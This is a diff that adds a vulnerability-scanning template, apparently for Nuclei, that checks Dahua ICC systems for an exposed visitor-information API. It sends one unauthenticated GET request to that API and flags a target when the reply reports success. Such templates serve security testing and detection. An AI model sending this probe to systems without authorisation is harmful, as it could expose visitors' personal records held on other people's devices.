@@ -1,0 +1,21 @@
+
+id: dahua-icc-getReviewInfoByVisitorId-weak
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-visitor/1.0.0/card/visitor/getReviewInfoByVisitorId/1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+        Accept-Encoding: gzip
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'\"success\":true','\"code\":\"0\"')
